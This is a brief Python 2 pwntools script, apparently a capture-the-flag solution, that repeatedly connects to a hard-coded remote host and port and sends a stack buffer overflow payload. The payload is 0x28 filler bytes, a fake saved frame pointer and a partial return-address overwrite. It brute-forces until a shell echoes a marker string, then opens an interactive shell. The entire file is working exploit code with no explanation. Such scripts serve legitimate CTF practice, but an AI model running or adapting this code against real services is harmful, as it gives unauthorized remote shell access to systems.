#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# 

context.arch = 'i386'

#e , l = ELF('./readme-fc826c708f619e14b137630581b766b23e3db765') , ELF('./libc.so.6-14c22be9aa11316f89909e4237314e009da38883')

host , port = '35.194.234.201' , 2117

#y = remote( host , port )



while True:
    y = remote( host , port )

    p = 'D' * 0x28 + 'EBBP' + '\x19\xe8\x5f'
    y.sendafter( ':' , p )

    try:
        sleep( 0.5 )
        y.sendline( 'echo yuawn' )

        print y.recvuntil( 'yuawn' )
        y.interactive()
        break
    except:
        y.close()

    #y.interactive()



#y.interactive()

